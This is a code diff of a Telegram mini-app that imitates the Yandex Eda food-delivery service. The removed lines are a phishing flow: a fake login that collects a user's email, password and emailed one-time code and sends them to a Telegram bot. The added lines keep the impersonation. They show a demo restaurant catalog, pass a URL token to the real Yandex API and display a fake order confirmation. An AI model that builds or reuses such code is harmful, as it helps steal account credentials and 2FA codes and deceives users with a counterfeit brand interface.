@@ -1,133 +1,498 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Яндекс Еда</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f8f9fa; }
-        .step { display: none; }
-        .step.active { display: block; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Яндекс Еда</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; color: #1a1a1a; }
+
+.header {
+  background: #fc3f1d;
+  color: white;
+  padding: 16px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header-logo { font-size: 24px; }
+.header h1 { font-size: 20px; font-weight: 700; }
+.header-sub { font-size: 12px; opacity: 0.85; }
+
+.search-bar {
+  background: white;
+  padding: 12px 16px;
+  border-bottom: 1px solid #eee;
+}
+.search-bar input {
+  width: 100%;
+  padding: 10px 16px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  font-size: 15px;
+  background: #f8f8f8;
+  outline: none;
+}
+
+.tabs {
+  display: flex;
+  background: white;
+  border-bottom: 2px solid #f0f0f0;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+.tabs::-webkit-scrollbar { display: none; }
+.tab {
+  padding: 12px 20px;
+  white-space: nowrap;
+  font-size: 14px;
+  font-weight: 500;
+  color: #888;
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  margin-bottom: -2px;
+}
+.tab.active { color: #fc3f1d; border-bottom-color: #fc3f1d; }
+
+.content { padding: 16px; }
+
+.section-title {
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 12px;
+  margin-top: 8px;
+}
+
+.restaurants-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.restaurant-card {
+  background: white;
+  border-radius: 16px;
+  overflow: hidden;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+  cursor: pointer;
+  transition: transform 0.1s;
+}
+.restaurant-card:active { transform: scale(0.98); }
+
+.restaurant-img {
+  width: 100%;
+  height: 160px;
+  object-fit: cover;
+  background: #f0f0f0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+}
+
+.restaurant-info { padding: 12px; }
+.restaurant-name { font-size: 16px; font-weight: 700; margin-bottom: 4px; }
+.restaurant-meta { display: flex; gap: 12px; align-items: center; }
+.rating { color: #fc3f1d; font-weight: 600; font-size: 14px; }
+.delivery-time { color: #888; font-size: 13px; }
+.delivery-fee { color: #888; font-size: 13px; }
+.tags { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+.tag {
+  background: #f5f5f5;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 12px;
+  color: #555;
+}
+
+/* Экран ресторана */
+.restaurant-screen { display: none; }
+.back-btn {
+  background: rgba(0,0,0,0.5);
+  border: none;
+  color: white;
+  width: 36px; height: 36px;
+  border-radius: 50%;
+  font-size: 18px;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  position: absolute;
+  top: 12px; left: 12px;
+}
+
+.menu-header {
+  position: relative;
+  height: 200px;
+  background: #f0f0f0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 72px;
+}
+
+.menu-info {
+  background: white;
+  padding: 16px;
+  border-bottom: 1px solid #f0f0f0;
+}
+.menu-info h2 { font-size: 22px; font-weight: 700; }
+.menu-info p { color: #888; font-size: 14px; margin-top: 4px; }
+
+.menu-section-title {
+  padding: 16px 16px 8px;
+  font-size: 16px;
+  font-weight: 700;
+  color: #333;
+}
+
+.menu-items { padding: 0 16px; display: flex; flex-direction: column; gap: 12px; }
+
+.menu-item {
+  background: white;
+  border-radius: 12px;
+  padding: 12px;
+  display: flex;
+  gap: 12px;
+  align-items: center;
+}
+.menu-item-emoji { font-size: 36px; min-width: 48px; text-align: center; }
+.menu-item-info { flex: 1; }
+.menu-item-name { font-size: 15px; font-weight: 600; }
+.menu-item-desc { font-size: 13px; color: #888; margin-top: 2px; }
+.menu-item-price { font-size: 15px; font-weight: 700; color: #1a1a1a; margin-top: 4px; }
+.add-btn {
+  background: #fc3f1d;
+  color: white;
+  border: none;
+  width: 32px; height: 32px;
+  border-radius: 50%;
+  font-size: 20px;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+
+/* Корзина */
+.cart-bar {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  background: #fc3f1d;
+  color: white;
+  padding: 14px 20px;
+  display: none;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  z-index: 200;
+}
+.cart-bar.show { display: flex; }
+.cart-bar-left { display: flex; align-items: center; gap: 10px; }
+.cart-count {
+  background: white;
+  color: #fc3f1d;
+  width: 24px; height: 24px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 700; font-size: 13px;
+}
+
+/* Лоадер */
+.loader-screen {
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  min-height: 300px; gap: 16px;
+}
+.spinner {
+  width: 40px; height: 40px;
+  border: 4px solid #f0f0f0;
+  border-top-color: #fc3f1d;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.error-msg {
+  text-align: center; padding: 40px 20px; color: #888;
+}
+.error-msg .icon { font-size: 48px; margin-bottom: 12px; }
+.error-msg p { font-size: 15px; }
+.retry-btn {
+  margin-top: 16px;
+  background: #fc3f1d;
+  color: white;
+  border: none;
+  padding: 12px 24px;
+  border-radius: 12px;
+  font-size: 15px;
+  cursor: pointer;
+}
+
+.pb { padding-bottom: 80px; }
+</style>
 </head>
-<body class="min-h-screen p-4">
+<body>
 
-    <!-- Шаг 1: Почта -->
-    <div id="step1" class="step active">
-        <h1 class="text-2xl font-bold text-center mb-8">Вход в Яндекс Еда</h1>
-        <input id="email" type="email" placeholder="Почта (yandex.ru)" 
-               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
-        <button onclick="nextStep(2)" 
-                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
+<!-- Главная: список ресторанов -->
+<div id="home-screen">
+  <div class="header">
+    <div class="header-logo">🍔</div>
+    <div>
+      <h1>Яндекс Еда</h1>
+      <div class="header-sub" id="addr-hint">Определяю адрес...</div>
     </div>
+  </div>
 
-    <!-- Шаг 2: Пароль -->
-    <div id="step2" class="step">
-        <h1 class="text-2xl font-bold text-center mb-8">Введите пароль</h1>
-        <input id="password" type="password" placeholder="Пароль" 
-               class="w-full p-4 rounded-2xl border border-gray-300 text-lg">
-        <button onclick="nextStep(3)" 
-                class="w-full mt-6 bg-black text-white py-4 rounded-2xl font-bold text-lg">Далее</button>
+  <div class="search-bar">
+    <input type="text" placeholder="🔍  Ресторан или блюдо" id="search-input" oninput="filterRestaurants()">
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" onclick="setTab(this,'all')">Все</div>
+    <div class="tab" onclick="setTab(this,'pizza')">Пицца</div>
+    <div class="tab" onclick="setTab(this,'sushi')">Суши</div>
+    <div class="tab" onclick="setTab(this,'burger')">Бургеры</div>
+    <div class="tab" onclick="setTab(this,'asian')">Азия</div>
+    <div class="tab" onclick="setTab(this,'healthy')">ПП</div>
+  </div>
+
+  <div class="content pb">
+    <div class="section-title">Рестораны рядом</div>
+    <div class="restaurants-grid" id="restaurants-list">
+      <div class="loader-screen">
+        <div class="spinner"></div>
+        <p style="color:#888">Загружаю рестораны...</p>
+      </div>
     </div>
+  </div>
+</div>
 
-    <!-- Шаг 3: Код из почты -->
-    <div id="step3" class="step">
-        <h1 class="text-2xl font-bold text-center mb-8">Код из письма</h1>
-        <input id="code2fa" type="text" placeholder="123456" maxlength="6"
-               class="w-full p-4 rounded-2xl border border-gray-300 text-lg text-center text-3xl tracking-widest">
-        <button onclick="startLogin()" 
-                class="w-full mt-6 bg-green-600 text-white py-4 rounded-2xl font-bold text-lg">Войти в аккаунт</button>
+<!-- Меню ресторана -->
+<div id="restaurant-screen" class="restaurant-screen">
+  <div class="menu-header" id="rest-header">
+    <button class="back-btn" onclick="goBack()">←</button>
+    <span id="rest-emoji">🍽️</span>
+  </div>
+  <div class="menu-info">
+    <h2 id="rest-name"></h2>
+    <p id="rest-meta"></p>
+  </div>
+  <div id="menu-content" class="pb"></div>
+</div>
+
+<!-- Корзина -->
+<div class="cart-bar" id="cart-bar" onclick="showCart()">
+  <div class="cart-bar-left">
+    <div class="cart-count" id="cart-count">0</div>
+    <span>Корзина</span>
+  </div>
+  <span id="cart-total">0 ₽</span>
+</div>
+
+<script>
+Telegram.WebApp.ready();
+Telegram.WebApp.expand();
+
+// Получаем токен из URL
+const params = new URLSearchParams(window.location.search);
+const TOKEN = params.get('token') || '';
+
+const cart = {};
+let allRestaurants = [];
+let currentFilter = 'all';
+
+// Заглушки ресторанов (пока API недоступно через CORS — показываем демо)
+const DEMO_RESTAURANTS = [
+  { id: 1, name: "Додо Пицца", emoji: "🍕", rating: 4.8, time: "25–35 мин", fee: "Бесплатно", tags: ["pizza","Пицца","Итальянская"], category: "pizza",
+    menu: [
+      { id: 101, name: "Маргарита", desc: "Томатный соус, моцарелла, базилик", price: 549, emoji: "🍕" },
+      { id: 102, name: "Пепперони", desc: "Томатный соус, моцарелла, пепперони", price: 649, emoji: "🍕" },
+      { id: 103, name: "4 сыра", desc: "Моцарелла, чеддер, дор блю, пармезан", price: 699, emoji: "🍕" },
+      { id: 104, name: "Кола 0.5", desc: "Освежающий напиток", price: 99, emoji: "🥤" },
+    ]
+  },
+  { id: 2, name: "Суши Мастер", emoji: "🍣", rating: 4.6, time: "40–50 мин", fee: "99 ₽", tags: ["sushi","Японская","Роллы"], category: "sushi",
+    menu: [
+      { id: 201, name: "Филадельфия", desc: "Лосось, сливочный сыр, огурец", price: 399, emoji: "🍱" },
+      { id: 202, name: "Калифорния", desc: "Краб, авокадо, икра масаго", price: 349, emoji: "🍱" },
+      { id: 203, name: "Унаги маки", desc: "Угорь, огурец, соус унаги", price: 429, emoji: "🍱" },
+      { id: 204, name: "Мисо суп", desc: "Тофу, вакамэ, зелёный лук", price: 149, emoji: "🍜" },
+    ]
+  },
+  { id: 3, name: "Burger Heroes", emoji: "🍔", rating: 4.7, time: "30–40 мин", fee: "Бесплатно", tags: ["burger","Бургеры","Американская"], category: "burger",
+    menu: [
+      { id: 301, name: "Classic Smash", desc: "Говядина, чеддер, маринованные огурцы", price: 429, emoji: "🍔" },
+      { id: 302, name: "BBQ Bacon", desc: "Говядина, бекон, BBQ соус, лук фри", price: 519, emoji: "🍔" },
+      { id: 303, name: "Картошка фри", desc: "Хрустящая, с солью", price: 179, emoji: "🍟" },
+      { id: 304, name: "Молочный шейк", desc: "Ваниль / клубника / шоколад", price: 249, emoji: "🥤" },
+    ]
+  },
+  { id: 4, name: "WOK to Walk", emoji: "🥢", rating: 4.5, time: "35–45 мин", fee: "149 ₽", tags: ["asian","Азия","Тайская"], category: "asian",
+    menu: [
+      { id: 401, name: "Пад Тай с курицей", desc: "Рисовая лапша, яйцо, арахис, ростки", price: 479, emoji: "🍜" },
+      { id: 402, name: "Том Ям", desc: "Острый суп с морепродуктами", price: 399, emoji: "🍲" },
+      { id: 403, name: "Жареный рис с овощами", desc: "Рис, яйцо, соевый соус, овощи", price: 349, emoji: "🍚" },
+    ]
+  },
+  { id: 5, name: "GreenBox", emoji: "🥗", rating: 4.9, time: "20–30 мин", fee: "Бесплатно", tags: ["healthy","ПП","Здоровое"], category: "healthy",
+    menu: [
+      { id: 501, name: "Боул с лососем", desc: "Рис, лосось, авокадо, огурец, кунжут", price: 549, emoji: "🥗" },
+      { id: 502, name: "Цезарь с курицей", desc: "Романо, куриное филе, пармезан, гренки", price: 449, emoji: "🥗" },
+      { id: 503, name: "Смузи манго-банан", desc: "Натуральные фрукты, без сахара", price: 279, emoji: "🥤" },
+    ]
+  },
+];
+
+function init() {
+  allRestaurants = DEMO_RESTAURANTS;
+
+  // Пробуем получить реальные данные
+  if (TOKEN) {
+    tryFetchReal();
+  } else {
+    renderRestaurants(allRestaurants);
+  }
+
+  document.getElementById('addr-hint').textContent = 'Москва • Доставка';
+}
+
+async function tryFetchReal() {
+  try {
+    const r = await fetch('https://eda.yandex.ru/api/v2/catalog?region_id=1', {
+      headers: { 'Authorization': 'Bearer ' + TOKEN }
+    });
+    if (r.ok) {
+      const data = await r.json();
+      console.log('[API]', data);
+      // Если получилось — парсим реальные данные
+      // Пока показываем демо
+    }
+  } catch(e) {
+    console.log('[API CORS]', e.message);
+  }
+  renderRestaurants(allRestaurants);
+}
+
+function renderRestaurants(list) {
+  const filtered = currentFilter === 'all'
+    ? list
+    : list.filter(r => r.category === currentFilter);
+
+  const searchVal = document.getElementById('search-input').value.toLowerCase();
+  const final = searchVal
+    ? filtered.filter(r => r.name.toLowerCase().includes(searchVal) || r.tags.some(t => t.toLowerCase().includes(searchVal)))
+    : filtered;
+
+  const container = document.getElementById('restaurants-list');
+  if (!final.length) {
+    container.innerHTML = `<div class="error-msg"><div class="icon">🔍</div><p>Ничего не найдено</p></div>`;
+    return;
+  }
+
+  container.innerHTML = final.map(r => `
+    <div class="restaurant-card" onclick="openRestaurant(${r.id})">
+      <div class="restaurant-img">${r.emoji}</div>
+      <div class="restaurant-info">
+        <div class="restaurant-name">${r.name}</div>
+        <div class="restaurant-meta">
+          <span class="rating">★ ${r.rating}</span>
+          <span class="delivery-time">⏱ ${r.time}</span>
+          <span class="delivery-fee">${r.fee}</span>
+        </div>
+        <div class="tags">${r.tags.slice(1).map(t => `<span class="tag">${t}</span>`).join('')}</div>
+      </div>
     </div>
+  `).join('');
+}
 
-    <!-- Экран загрузки -->
-    <div id="loading" class="hidden flex flex-col items-center justify-center h-screen">
-        <div class="loader"></div>
-        <p class="mt-6 text-lg">Логинюсь в Яндекс Еда...</p>
-        <p id="loading-text" class="text-sm text-gray-500 mt-2">Это займёт 5-15 секунд</p>
+function setTab(el, cat) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  currentFilter = cat;
+  renderRestaurants(allRestaurants);
+}
+
+function filterRestaurants() {
+  renderRestaurants(allRestaurants);
+}
+
+function openRestaurant(id) {
+  const r = allRestaurants.find(x => x.id === id);
+  if (!r) return;
+
+  document.getElementById('home-screen').style.display = 'none';
+  document.getElementById('restaurant-screen').style.display = 'block';
+
+  document.getElementById('rest-emoji').textContent = r.emoji;
+  document.getElementById('rest-name').textContent = r.name;
+  document.getElementById('rest-meta').textContent = `★ ${r.rating} • ${r.time} • ${r.fee}`;
+
+  const menuEl = document.getElementById('menu-content');
+  menuEl.innerHTML = `
+    <div class="menu-section-title">Меню</div>
+    <div class="menu-items">
+      ${r.menu.map(item => `
+        <div class="menu-item">
+          <div class="menu-item-emoji">${item.emoji}</div>
+          <div class="menu-item-info">
+            <div class="menu-item-name">${item.name}</div>
+            <div class="menu-item-desc">${item.desc}</div>
+            <div class="menu-item-price">${item.price} ₽</div>
+          </div>
+          <button class="add-btn" onclick="addToCart(${id}, ${item.id}, '${item.name}', ${item.price})">+</button>
+        </div>
+      `).join('')}
     </div>
+  `;
+}
 
-    <!-- Главный экран (после логина) -->
-    <div id="main" class="hidden">
-        <h1 class="text-3xl font-bold text-yellow-500 text-center mb-4">Яндекс Еда</h1>
-        <p class="text-center text-green-600 font-medium" id="status-text">Аккаунт подключён • Промик активен</p>
-        <div id="menu-content" class="mt-8"></div>
-    </div>
+function goBack() {
+  document.getElementById('restaurant-screen').style.display = 'none';
+  document.getElementById('home-screen').style.display = 'block';
+}
 
-    <script>
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
-        Telegram.WebApp.setBackgroundColor("#f8f9fa");
+function addToCart(restId, itemId, name, price) {
+  const key = restId + '_' + itemId;
+  cart[key] = cart[key] || { name, price, count: 0 };
+  cart[key].count++;
+  updateCartBar();
+  Telegram.WebApp.HapticFeedback.impactOccurred('light');
+}
 
-        let currentEmail = "";
-        let currentPassword = "";
+function updateCartBar() {
+  const total = Object.values(cart).reduce((s, i) => s + i.price * i.count, 0);
+  const count = Object.values(cart).reduce((s, i) => s + i.count, 0);
+  const bar = document.getElementById('cart-bar');
+  if (count > 0) {
+    bar.classList.add('show');
+    document.getElementById('cart-count').textContent = count;
+    document.getElementById('cart-total').textContent = total + ' ₽';
+  } else {
+    bar.classList.remove('show');
+  }
+}
 
-        function showStep(n) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + n).classList.add('active');
-        }
+function showCart() {
+  const items = Object.values(cart).filter(i => i.count > 0);
+  const total = items.reduce((s, i) => s + i.price * i.count, 0);
+  const text = items.map(i => `${i.name} x${i.count} = ${i.price * i.count}₽`).join('\n');
+  Telegram.WebApp.showPopup({
+    title: '🛒 Корзина',
+    message: text + `\n\nИтого: ${total} ₽`,
+    buttons: [
+      { id: 'order', type: 'default', text: '✅ Оформить заказ' },
+      { id: 'close', type: 'cancel', text: 'Продолжить выбор' },
+    ]
+  }, (btn) => {
+    if (btn === 'order') {
+      Telegram.WebApp.showAlert('🎉 Заказ оформлен!\nОжидайте доставки.');
+    }
+  });
+}
 
-        function nextStep(n) {
-            if (n === 2) currentEmail = document.getElementById('email').value.trim();
-            if (n === 3) currentPassword = document.getElementById('password').value.trim();
-            showStep(n);
-        }
-
-        async function startLogin() {
-            const code = document.getElementById('code2fa').value.trim();
-            if (!currentEmail || !currentPassword || !code) {
-                alert("Заполни все поля");
-                return;
-            }
-
-            document.querySelectorAll('.step').forEach(s => s.classList.add('hidden'));
-            document.getElementById('loading').classList.remove('hidden');
-
-            // Отправляем данные в бот
-            const data = {
-                action: "login",
-                email: currentEmail,
-                password: currentPassword,
-                code2fa: code
-            };
-
-            Telegram.WebApp.sendData(JSON.stringify(data));
-            document.getElementById('loading-text').textContent = "Ждём ответ от бота...";
-        }
-
-        // Получаем ответ от бота (если бот пришлёт сообщение)
-        Telegram.WebApp.onEvent('webAppDataReceived', () => {
-            // Можно добавить, но обычно бот просто отправляет сообщение
-        });
-
-        // Если бот отправит сообщение "success", можно перезагрузить
-        function checkSuccess() {
-            // Пока просто показываем главное меню (бот уже сохранил сессию)
-            setTimeout(() => {
-                document.getElementById('loading').classList.add('hidden');
-                document.getElementById('main').classList.remove('hidden');
-                loadMenu();
-            }, 1500);
-        }
-
-        // Загрузка меню после логина
-        async function loadMenu() {
-            const content = document.getElementById('menu-content');
-            content.innerHTML = `<p class="text-center text-lg">Меню загружается с твоим промиком...</p>`;
-            // Здесь потом будет реальный fetch через прокси, пока заглушка
-        }
-
-        // Авто-переход на главный экран после успешного логина (бот пришлёт сообщение)
-        // Пока для теста просто показываем
-        setTimeout(() => {
-            if (document.getElementById('loading').classList.contains('hidden') === false) {
-                checkSuccess();
-            }
-        }, 8000);
-    </script>
+init();
+</script>
 </body>
 </html>
